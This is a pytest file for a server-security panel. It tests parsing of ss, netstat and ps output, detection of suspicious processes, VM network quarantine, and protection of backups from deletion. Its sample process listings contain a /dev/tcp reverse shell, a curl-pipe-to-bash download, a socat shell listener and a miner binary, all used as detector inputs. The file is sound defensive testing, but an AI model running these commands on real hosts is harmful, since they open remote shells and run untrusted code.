"""端口/进程巡检、虚拟机隔离、备份防删：解析、判定与接口回归。

纯函数部分喂手写的 ``ss`` / ``netstat`` / ``ps`` 输出，结果与跑测试的机器无关；
接口部分用 monkeypatch 把真正会连 PVE / SSH 的函数换成桩 —— 被测的是路由、权限
与「面板层禁止删除受保护备份」这条关键控制。
"""
from __future__ import annotations

import os
import sys
from pathlib import Path
from typing import Any, Dict, List

import pytest

BACKEND_DIR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(BACKEND_DIR))
os.environ.setdefault("SECRET_KEY", "test-secret-key-for-unit-tests-only")

from app import backupguard, isolation, portguard  # noqa: E402
from app.config import settings  # noqa: E402
from conftest import connect  # noqa: E402
from test_api_routes import api, auth_headers  # noqa: E402,F401

STRONG = "Unit-Test-Pa55word"


def _audit_actions() -> List[str]:
    conn = connect(settings.db_name)
    try:
        with conn.cursor() as cursor:
            cursor.execute("SELECT action FROM audit_log")
            return [row[0] for row in cursor.fetchall()]
    finally:
        conn.close()


# 一份「像真的」ss -tulpn 输出：sshd 全网卡、redis 全网卡（敏感端口）、
# 两个只监听本机的（不该被当成对外开放）、一个 netstat 格式的老系统行
SS_OUTPUT = """
tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*    users:(("sshd",pid=1096,fd=3))
tcp   LISTEN 0      128             [::]:22           [::]:*    users:(("sshd",pid=1096,fd=4))
tcp   LISTEN 0      511          0.0.0.0:80        0.0.0.0:*    users:(("nginx",pid=1018,fd=6))
tcp   LISTEN 0      511             [::]:80           [::]:*    users:(("nginx",pid=1018,fd=7))
tcp   LISTEN 0      511        127.0.0.1:6379        0.0.0.0:*    users:(("redis-server",pid=900,fd=6))
tcp   LISTEN 0      128          0.0.0.0:3306        0.0.0.0:*    users:(("mysqld",pid=808,fd=22))
udp   UNCONN 0      0            0.0.0.0:68        0.0.0.0:*    users:(("dhclient",pid=800,fd=6))
tcp        0      0 0.0.0.0:8181            0.0.0.0:*               LISTEN      1234/java
"""

SS_CONN = """
tcp   ESTAB 0      0      10.0.0.5:22       10.0.0.9:51234  users:(("sshd",pid=1096,fd=5))
tcp   ESTAB 0      0      10.0.0.5:44812    203.0.113.7:4444 users:(("bash",pid=4321,fd=3))
tcp   ESTAB 0      0      10.0.0.5:22       10.0.0.8:40000  users:(("sshd",pid=1097,fd=5))
tcp   ESTAB 0      0        127.0.0.1:8080     127.0.0.1:53122 users:(("python",pid=700,fd=9))
"""

PS_OUTPUT = """
  1096       1 root     10-01:02:03 sshd        /usr/sbin/sshd -D
   900       1 redis    3-04:05:06 redis-server /usr/bin/redis-server 127.0.0.1:6379
  4321    1018 www-data 00:12:30 bash        bash -i >& /dev/tcp/203.0.113.7/4444 0>&1
  5000       1 root     2-00:00:00 nginx       nginx: worker process
  6001       1 root     00:01:00 kdevtmpfsi  /tmp/.x/kdevtmpfsi
  7000    5000 nobody   00:20:00 sh          sh -c "curl -s http://x.tld/i.sh | bash"
  8000       1 ops      1-00:00:00 socat       socat tcp-l:9001,reuseaddr,fork exec:/bin/bash
  9000       1 ops      00:05:00 bash        bash -c "curl -i http://localhost/health"
"""

EXE_LINKS = """
lrwxrwxrwx 1 root root 0 Sep 25 16:20 /proc/4321/exe -> /usr/bin/bash
lrwxrwxrwx 1 root root 0 Sep 25 16:20 /proc/6001/exe -> /tmp/.x/kdevtmpfsi
lrwxrwxrwx 1 root root 0 Sep 25 16:20 /proc/7000/exe -> /usr/bin/sh
lrwxrwxrwx 1 root root 0 Sep 25 16:20 /proc/8888/exe -> /tmp/payload (deleted)
"""


def _snapshot(**overrides: Any) -> Dict[str, Any]:
    base: Dict[str, Any] = {
        "elevated": True,
        "listeners": portguard.parse_listeners(SS_OUTPUT),
        "connections": portguard.parse_connections(SS_CONN),
        "processes": portguard.parse_processes(PS_OUTPUT),
        "exe": portguard.parse_exe_links(EXE_LINKS),
        "firewall": {"active": True, "manager": "firewalld", "detail": ""},
        "hostname": "web1",
        "kernel": "6.6.0",
        "os_release": 'PRETTY_NAME="TestOS"\n',
    }
    base.update(overrides)
    return base


# --------------------------------------------------------------------- 解析
class TestParsing:
    def test_split_addr_handles_ipv4_and_ipv6(self) -> None:
        assert portguard.split_addr("0.0.0.0:22") == ("0.0.0.0", 22)
        assert portguard.split_addr("[::]:443") == ("::", 443)
        assert portguard.split_addr("[::1]:443") == ("::1", 443)
        assert portguard.split_addr("garbage") == ("garbage", 0)

    def test_address_scope(self) -> None:
        assert portguard.address_scope("127.0.0.1") == "loopback"
        assert portguard.address_scope("127.0.0.53") == "loopback"
        assert portguard.address_scope("::1") == "loopback"
        assert portguard.address_scope("0.0.0.0") == "all"
        assert portguard.address_scope("*") == "all"
        assert portguard.address_scope("::") == "all"
        assert portguard.address_scope("10.0.0.5") == "specific"
        assert portguard.address_scope("fe80::1") == "loopback"

    def test_parse_listeners_ss_and_netstat(self) -> None:
        entries = portguard.parse_listeners(SS_OUTPUT)
        by_addr = {(item["address"], item["port"]): item for item in entries}
        assert by_addr[("0.0.0.0", 22)]["process"] == "sshd"
        assert by_addr[("0.0.0.0", 22)]["pid"] == 1096
        assert by_addr[("::", 22)]["scope"] == "all"
        assert by_addr[("127.0.0.1", 6379)]["scope"] == "loopback"
        assert by_addr[("0.0.0.0", 68)]["proto"] == "udp"
        # netstat 那行的 pid/进程名也能解析出来
        assert by_addr[("0.0.0.0", 8181)]["process"] == "java"
        assert by_addr[("0.0.0.0", 8181)]["pid"] == 1234

    def test_parse_listeners_ignores_headers(self) -> None:
        assert portguard.parse_listeners("State Recv-Q Send-Q Local\nProto Recv-Q\n") == []

    def test_parse_connections_only_established(self) -> None:
        entries = portguard.parse_connections(SS_CONN)
        assert len(entries) == 4
        peer = {item["pid"]: item for item in entries}
        assert peer[4321]["peer_port"] == 4444
        assert peer[4321]["peer_scope"] == "specific"
        assert peer[700]["peer_scope"] == "loopback"

    def test_parse_processes_keeps_command_line_with_spaces(self) -> None:
        entries = {item["pid"]: item for item in portguard.parse_processes(PS_OUTPUT)}
        assert entries[4321]["name"] == "bash"
        assert "/dev/tcp/203.0.113.7/4444" in entries[4321]["args"]
        assert entries[8000]["user"] == "ops"
        assert entries[4321]["etime"] == "00:12:30"

    def test_parse_exe_links_marks_deleted(self) -> None:
        links = portguard.parse_exe_links(EXE_LINKS)
        assert links[6001] == {"exe": "/tmp/.x/kdevtmpfsi", "deleted": False}
        assert links[8888]["deleted"] is True
        assert links[8888]["exe"] == "/tmp/payload"


# --------------------------------------------------------------------- 策略
class TestPolicy:
    def test_normalise_clamps_and_drops_bad_regex(self) -> None:
        policy = portguard.normalise_policy(
            {
                "cooldown_minutes": 99999,
                "expected_ports": ["22", "", "  ", "80"],
                "process_whitelist": ["ok-.*", "([unclosed", ""],
            }
        )
        assert policy["cooldown_minutes"] == 1440
        assert policy["expected_ports"] == ["22", "80"]
        # 非法正则直接丢掉，否则每次巡检都会炸
        assert policy["process_whitelist"] == ["ok-.*"]

    def test_normalise_tolerates_garbage(self) -> None:
        policy = portguard.normalise_policy("not-a-dict")  # type: ignore[arg-type]
        assert policy["enabled"] is True
        assert policy["expected_ports"] == portguard.DEFAULT_POLICY["expected_ports"]

    def test_port_is_expected_accepts_three_forms(self) -> None:
        assert portguard.port_is_expected(22, "0.0.0.0", ["22"]) is True
        assert portguard.port_is_expected(80, "0.0.0.0", ["0.0.0.0:80"]) is True
        assert portguard.port_is_expected(443, "::", ["*:443"]) is True
        assert portguard.port_is_expected(80, "10.0.0.5", ["0.0.0.0:80"]) is False
        assert portguard.port_is_expected(8080, "0.0.0.0", ["80", "*:443"]) is False


# --------------------------------------------------------------------- 判定
class TestAssess:
    def test_loopback_listener_is_not_exposed(self) -> None:
        result = portguard.assess(_snapshot(), portguard.DEFAULT_POLICY)
        redis = next(item for item in result["listeners"] if item["port"] == 6379)
        assert redis["exposed"] is False
        assert redis["port"] not in result["summary"]["unexpected_ports"]

    def test_unexpected_exposed_ports(self) -> None:
        result = portguard.assess(_snapshot(), portguard.DEFAULT_POLICY)
        # 默认策略只把 22 当预期：80（v4+v6 各一条）/3306/8181 都算非预期，
        # udp 68 也监听在 0.0.0.0。汇总里的端口去重。
        assert result["summary"]["unexpected_ports"] == [68, 80, 3306, 8181]
        assert result["summary"]["unexpected"] == 5
        assert result["summary"]["exposed"] == 7

    def test_expected_ports_are_not_flagged(self) -> None:
        policy = {**portguard.DEFAULT_POLICY, "expected_ports": ["22", "80", "*:8181"]}
        result = portguard.assess(_snapshot(), policy)
        assert result["summary"]["unexpected_ports"] == [68, 3306]

    def test_severity_uses_firewall_and_sensitivity(self) -> None:
        result = portguard.assess(_snapshot(), portguard.DEFAULT_POLICY)
        mysql = next(item for item in result["unexpected"] if item["port"] == 3306)
        http = next(item for item in result["unexpected"] if item["port"] == 80)
        # 有防火墙：敏感端口降为中危，普通端口低危
        assert portguard.port_severity(mysql, True) == "medium"
        # 没有防火墙：敏感端口升为高危，普通端口升为中危
        assert portguard.port_severity(mysql, False) == "high"
        assert portguard.port_severity(http, True) == "low"
        assert portguard.port_severity(http, False) == "medium"

    def test_legacy_port_is_always_high(self) -> None:
        telnet = {"port": 23}
        assert portguard.port_severity(telnet, True) == "high"
        assert portguard.port_severity(telnet, False) == "high"

    def test_rebound_shell_via_dev_tcp_is_high(self) -> None:
        result = portguard.assess(_snapshot(), portguard.DEFAULT_POLICY)
        item = next(p for p in result["suspicious"] if p["pid"] == 4321)
        codes = {signal["code"] for signal in item["signals"]}
        assert "rebound_dev_tcp" in codes
        assert "rebound_shell_i" in codes
        assert item["severity"] == "high"

    def test_known_malware_and_tmp_exe(self) -> None:
        result = portguard.assess(_snapshot(), portguard.DEFAULT_POLICY)
        miner = next(p for p in result["suspicious"] if p["pid"] == 6001)
        codes = {signal["code"] for signal in miner["signals"]}
        assert "known_malware" in codes
        assert "tmp_exe" in codes
        assert miner["severity"] == "high"

    def test_deleted_exe_is_flagged(self) -> None:
        # 8888 不在 ps 里，所以先把它的进程补进快照
        processes = portguard.parse_processes(PS_OUTPUT) + [
            {
                "pid": 8888, "ppid": 1, "user": "root", "etime": "00:01:00",
                "name": "payload", "args": "/tmp/payload",
            }
        ]
        result = portguard.assess(_snapshot(processes=processes), portguard.DEFAULT_POLICY)
        item = next(p for p in result["suspicious"] if p["pid"] == 8888)
        codes = {signal["code"] for signal in item["signals"]}
        assert "deleted_exe" in codes
        assert "tmp_exe" in codes

    def test_web_child_shell_and_pipe_to_shell(self) -> None:
        result = portguard.assess(_snapshot(), portguard.DEFAULT_POLICY)
        item = next(p for p in result["suspicious"] if p["pid"] == 7000)
        codes = {signal["code"] for signal in item["signals"]}
        # 父进程 5000 是 nginx worker → 命中「Web 服务派生 shell」
        assert "web_child_shell" in codes
        assert "shell_c_remote" in codes

    def test_socat_exec_is_high(self) -> None:
        result = portguard.assess(_snapshot(), portguard.DEFAULT_POLICY)
        item = next(p for p in result["suspicious"] if p["pid"] == 8000)
        assert "rebound_socat_exec" in {s["code"] for s in item["signals"]}

    def test_curl_dash_i_is_not_an_interactive_shell(self) -> None:
        """``bash -c "curl -i"`` 不能因为命令行里有 ``-i`` 就报「交互式 shell」。"""
        result = portguard.assess(_snapshot(), portguard.DEFAULT_POLICY)
        assert all(p["pid"] != 9000 for p in result["suspicious"])

    def test_shell_with_external_connection_is_high(self) -> None:
        processes = portguard.parse_processes(PS_OUTPUT) + [
            {
                "pid": 4321, "ppid": 1, "user": "ops", "etime": "00:03:00",
                "name": "bash", "args": "bash",
            }
        ]
        result = portguard.assess(_snapshot(processes=processes), portguard.DEFAULT_POLICY)
        item = next(p for p in result["suspicious"] if p["pid"] == 4321)
        assert "shell_with_external_conn" in {s["code"] for s in item["signals"]}

    def test_sshd_session_shell_is_not_flagged_as_rebound(self) -> None:
        """登录会话的 shell 持有的是本地 22 端口连接（服务端侧），不算反弹 shell。"""
        processes = [
            {
                "pid": 1096, "ppid": 1, "user": "root", "etime": "01:00:00",
                "name": "bash", "args": "bash",
            }
        ]
        result = portguard.assess(_snapshot(processes=processes), portguard.DEFAULT_POLICY)
        # 1096 在 SS_CONN 里的连接本地端口是 22 → 被排除
        assert all(p["pid"] != 1096 for p in result["suspicious"])

    def test_whitelist_suppresses_findings(self) -> None:
        policy = {**portguard.DEFAULT_POLICY, "process_whitelist": ["kdevtmpfsi"]}
        result = portguard.assess(_snapshot(), policy)
        assert all(p["pid"] != 6001 for p in result["suspicious"])

    def test_not_elevated_still_reports_ports(self) -> None:
        result = portguard.assess(_snapshot(elevated=False, exe={}), portguard.DEFAULT_POLICY)
        assert result["summary"]["unexpected"] == 5
        assert result["summary"]["unattributed"] == 0  # 非 root 时不把「看不到进程」当问题


def _dirty_report() -> Dict[str, Any]:
    """一台「没有防火墙 + 3306 对全网卡开放」的主机。"""
    return {
        "host_id": "local",
        "name": "web1",
        "host": "web1",
        "address": "10.0.0.5",
        "ok": True,
        "os": {},
        "firewall": {"active": False, "manager": ""},
        "suspicious": [],
        "summary": {
            "listeners": 1, "exposed": 1, "unexpected": 1, "unexpected_ports": [3306],
            "suspicious": 0, "highest": "", "unattributed": 0, "firewall_active": False,
        },
        "unexpected": [
            {
                "port": 3306, "proto": "tcp", "address": "0.0.0.0",
                "process": "mysqld", "sensitive": True,
            }
        ],
    }


# ------------------------------------------------------------- 联动告警
class TestAlerting:
    def test_finding_text_mentions_missing_firewall(self) -> None:
        report = {
            "name": "web1", "host_id": "local", "address": "10.0.0.5",
            "firewall": {"active": False},
            "unexpected": [{"port": 3306, "proto": "tcp", "address": "0.0.0.0", "process": "mysqld"}],
            "summary": {"unexpected": 1, "suspicious": 0},
            "suspicious": [],
        }
        text = portguard._finding_text(report, "ports")
        assert "没有活动防火墙" in text
        assert "3306" in text


# --------------------------------------------------------- 虚拟机隔离
class TestIsolation:
    RAW = "virtio=AA:BB:CC:DD:EE:FF,bridge=vmbr0,tag=10,firewall=1,rate=10"

    def test_set_link_down_preserves_other_attributes(self) -> None:
        cut = isolation.set_link_down(self.RAW, True)
        assert cut == self.RAW + ",link_down=1"
        # PVE 对 netX 是整串替换，往返必须一模一样，否则会丢掉 bridge/tag/mac
        assert isolation.set_link_down(cut, False) == self.RAW

    def test_set_link_down_replaces_existing_flag(self) -> None:
        raw = "virtio=AA:BB,link_down=0,bridge=vmbr0"
        assert isolation.set_link_down(raw, True) == "virtio=AA:BB,bridge=vmbr0,link_down=1"
        assert isolation.set_link_down(raw, False) == "virtio=AA:BB,bridge=vmbr0"

    def test_set_link_down_is_idempotent(self) -> None:
        once = isolation.set_link_down(self.RAW, True)
        assert isolation.set_link_down(once, True) == once

    def test_is_link_down(self) -> None:
        assert isolation.is_link_down("virtio=AA,link_down=1") is True
        assert isolation.is_link_down("virtio=AA,link_down=0") is False
        assert isolation.is_link_down("virtio=AA") is False

    def test_net_keys_sorted_numerically(self) -> None:
        config = {"net10": "a", "net0": "b", "scsi0": "c", "net1": "d", "ide2": "e"}
        assert isolation.net_keys(config) == ["net0", "net1", "net10"]

    def test_evidence_snapshot_name_is_pve_safe(self) -> None:
        name = isolation.evidence_snapshot_name(1_790_000_000)
        assert name.startswith(isolation.EVIDENCE_PREFIX)
        assert ":" not in name and "." not in name
        assert name.replace("-", "").replace("_", "").isalnum()


# --------------------------------------------------------- 备份防删
class TestBackupGuard:
    def test_meta_fingerprint_is_stable_and_size_sensitive(self) -> None:
        first = backupguard.meta_fingerprint("local:backup/x.vma.zst", 1024, 100)
        assert first == backupguard.meta_fingerprint("local:backup/x.vma.zst", 1024, 100)
        assert first != backupguard.meta_fingerprint("local:backup/x.vma.zst", 2048, 100)
        assert first != backupguard.meta_fingerprint("local:backup/x.vma.zst", 1024, 200)
        assert len(first) == 64


# ------------------------------------------------------------------- 接口
class TestApi:
    def test_ports_requires_auth(self, api) -> None:
        assert api.get("/api/ports/hosts").status_code == 401

    def test_ports_hosts_lists_local(self, api) -> None:
        resp = api.get("/api/ports/hosts", headers=auth_headers(api))
        assert resp.status_code == 200, resp.text
        assert resp.json()["hosts"][0]["id"] == "local"

    def test_ports_overview_is_audited(self, api, monkeypatch) -> None:
        async def _fake(host_ids=None):
            return {
                "hosts": [],
                "totals": {
                    "hosts": 1, "reachable": 1, "unreachable": 0, "exposed": 3,
                    "unexpected": 1, "suspicious": 0, "no_firewall": 0,
                },
                "generated_at": 1_790_000_000,
            }

        monkeypatch.setattr(portguard, "fleet_overview", _fake)
        resp = api.get("/api/ports/overview", headers=auth_headers(api))
        assert resp.status_code == 200, resp.text
        assert resp.json()["totals"]["unexpected"] == 1
        assert "ports.overview_read" in _audit_actions()

    def test_ports_host_detail_404_for_unknown(self, api) -> None:
        assert api.get("/api/ports/hosts/nope", headers=auth_headers(api)).status_code == 404

    def test_ports_check_fires_and_is_audited(self, api, monkeypatch) -> None:
        """立即巡检要真的走一遍「判定 → 告警落库」的链路。

        走 HTTP 而不是直接 ``asyncio.run(portguard.evaluate())``：数据库连接池是
        绑在应用事件循环上的，另起一个循环去用会直接报错。测试环境没配飞书/邮件，
        所以通知结果是 failed，但告警本身应当已经产生并落库。
        """

        async def _fake(host_ids=None):
            return [_dirty_report()]

        monkeypatch.setattr(portguard, "fleet_reports", _fake)
        resp = api.post("/api/ports/check", headers=auth_headers(api))
        assert resp.status_code == 200, resp.text
        body = resp.json()
        assert body["fired"] == 1
        item = body["items"][0]
        assert item["rule_id"] == "port-open"
        assert item["target_type"] == "host"
        assert item["value"] == 1.0
        assert "ports.check" in _audit_actions()

    def test_ports_check_is_idempotent_within_cooldown(self, api, monkeypatch) -> None:
        """同一对象在冷却期内不重复推送（靠 alert_active 去重）。"""

        async def _fake(host_ids=None):
            return [_dirty_report()]

        monkeypatch.setattr(portguard, "fleet_reports", _fake)
        headers = auth_headers(api)
        first = api.post("/api/ports/check", headers=headers)
        assert first.json()["fired"] == 1
        second = api.post("/api/ports/check", headers=headers)
        assert second.status_code == 200
        assert second.json()["fired"] == 0

    def test_policy_round_trip(self, api) -> None:
        headers = auth_headers(api)
        saved = api.put(
            "/api/ports/policy",
            headers=headers,
            json={
                "enabled": True,
                "alert_open_ports": True,
                "alert_suspicious": True,
                "cooldown_minutes": 30,
                "notify_user": "",
                "expected_ports": ["22", "*:443"],
                "process_whitelist": ["my-agent"],
            },
        )
        assert saved.status_code == 200, saved.text
        assert saved.json()["policy"]["expected_ports"] == ["22", "*:443"]
        assert "ports.policy_update" in _audit_actions()

        fetched = api.get("/api/ports/policy", headers=headers)
        assert fetched.status_code == 200
        assert fetched.json()["policy"]["cooldown_minutes"] == 30

    def test_viewer_can_read_but_not_manage_ports(self, api) -> None:
        admin = auth_headers(api)
        api.post(
            "/api/users",
            headers=admin,
            json={"username": "portviewer", "password": STRONG, "role": "viewer"},
        )
        login = api.post(
            "/api/auth/login", json={"username": "portviewer", "password": STRONG}
        )
        viewer = {"Authorization": f"Bearer {login.json()['access_token']}"}
        assert api.get("/api/ports/policy", headers=viewer).status_code == 200
        assert (
            api.put(
                "/api/ports/policy",
                headers=viewer,
                json={"expected_ports": ["22"]},
            ).status_code
            == 403
        )
        assert api.post("/api/ports/check", headers=viewer).status_code == 403

    def _first_vm(self, api, headers) -> tuple[str, int]:
        """取一台 mock PVE 里真实存在的机器：归属校验要能解析到它才会放行。"""
        vms = api.get("/api/vms", headers=headers).json()
        assert vms, "mock PVE 里应该有虚拟机"
        return str(vms[0]["node"]), int(vms[0]["vmid"])

    def test_quarantine_status_uses_module(self, api, monkeypatch) -> None:
        async def _fake(node: str, vmid: int):
            return {
                "node": node,
                "vmid": vmid,
                "isolated": True,
                "cut_interfaces": ["net0"],
                "networks": [{"interface": "net0", "value": "x,link_down=1", "link_down": True}],
                "protected": True,
                "evidence_snapshots": [{"name": "quarantine-x", "description": "", "snaptime": 1}],
            }

        monkeypatch.setattr(isolation, "status", _fake)
        headers = auth_headers(api)
        node, vmid = self._first_vm(api, headers)
        resp = api.get(f"/api/vms/{node}/{vmid}/quarantine", headers=headers)
        assert resp.status_code == 200, resp.text
        assert resp.json()["cut_interfaces"] == ["net0"]
        assert "vm.quarantine.read" in _audit_actions()

    def test_quarantine_action_is_audited(self, api, monkeypatch) -> None:
        seen: Dict[str, Any] = {}

        async def _fake(node: str, vmid: int, **kwargs: Any):
            seen.update({"node": node, "vmid": vmid, **kwargs})
            return {
                "node": node, "vmid": vmid, "ok": True,
                "steps": [{"step": "snapshot", "ok": True, "detail": "ok"}],
                "summary": "隔离处置成功", "snapshot": "quarantine-x",
                "interfaces": ["net0"], "power_action": "shutdown", "caveats": ["c1"],
            }

        monkeypatch.setattr(isolation, "quarantine", _fake)
        headers = auth_headers(api)
        node, vmid = self._first_vm(api, headers)
        resp = api.post(
            f"/api/vms/{node}/{vmid}/quarantine",
            headers=headers,
            json={"power_action": "none", "note": "疑似挖矿"},
        )
        assert resp.status_code == 200, resp.text
        assert resp.json()["snapshot"] == "quarantine-x"
        assert seen["power_action"] == "none"
        assert seen["note"] == "疑似挖矿"
        assert "vm.quarantine" in _audit_actions()

    def test_protected_backup_list_and_unprotect_404(self, api) -> None:
        headers = auth_headers(api)
        listed = api.get("/api/backups/protected", headers=headers)
        assert listed.status_code == 200, listed.text
        assert listed.json()["items"] == []
        # 不在清单里的卷不能「移除保护」
        assert (
            api.delete(
                "/api/backups/protected", headers=headers, params={"volid": "x:y"}
            ).status_code
            == 404
        )

    def test_delete_backup_is_blocked_when_protected(self, api, monkeypatch) -> None:
        from app.routers import backups as backups_router

        async def _protected(volid: str) -> bool:
            return volid == "local:backup/vzdump-qemu-100.vma.zst"

        async def _allow(*args: Any, **kwargs: Any) -> None:
            return None

        monkeypatch.setattr(backupguard, "is_protected", _protected)
        # 归属校验会去 PVE 找这个卷，这里只关心「受保护就不许删」这条控制
        monkeypatch.setattr(backups_router, "assert_backup_access", _allow)
        resp = api.delete(
            "/api/backups",
            headers=auth_headers(api),
            params={
                "node": "pve1",
                "storage": "backup",
                "volid": "local:backup/vzdump-qemu-100.vma.zst",
            },
        )
        assert resp.status_code == 400
        assert "受保护备份" in resp.json()["detail"]

    def test_protected_verify_reports_counts(self, api, monkeypatch) -> None:
        async def _reconcile():
            return {
                "checked": 1, "ok": 0, "missing": 1, "changed": 0, "unknown": 0,
                "items": [{"volid": "x", "state": "missing", "detail": "没了"}],
            }

        async def _evaluate(owner=None):
            return []

        monkeypatch.setattr(backupguard, "reconcile", _reconcile)
        monkeypatch.setattr(backupguard, "evaluate", _evaluate)
        resp = api.post("/api/backups/protected/verify", headers=auth_headers(api))
        assert resp.status_code == 200, resp.text
        assert resp.json()["missing"] == 1
        assert "backup.protected_verify" in _audit_actions()
